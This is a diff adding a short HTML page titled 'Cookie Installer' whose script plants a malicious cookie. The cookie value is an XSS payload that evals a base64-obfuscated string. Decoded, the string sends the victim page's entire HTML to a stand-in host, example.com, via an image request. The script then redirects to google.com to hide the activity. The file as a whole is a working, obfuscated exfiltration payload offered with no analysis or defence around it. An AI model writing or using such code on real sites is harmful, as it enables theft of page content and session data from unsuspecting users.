@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Cookie Installer</title>
+</head>
+<body>
+    <script>
+        // Inject a malicious cookie that executes when parsed
+        document.cookie = "x=<img src=x onerror=\"eval(atob('bmV3IEltYWdlKCkuc3JjID0gImh0dHA6Ly9leGFtcGxlLmNvbS8/ZXZpbD0iICsgZW5jb2RlVVJJQ29tcG9uZW50KGRvY3VtZW50LmdldEVsZW1lbnRzQnlUYWdOYW1lKCJodG1sIilbMF0uaW5uZXJIVE1MKTs='))\">; Path=/; Secure; HttpOnly;";
+
+        // Redirect to another page to ensure the cookie gets saved
+        setTimeout(() => {
+            window.location.href = "https://google.com";
+        }, 3000);
+    </script>
+</body>
+</html>
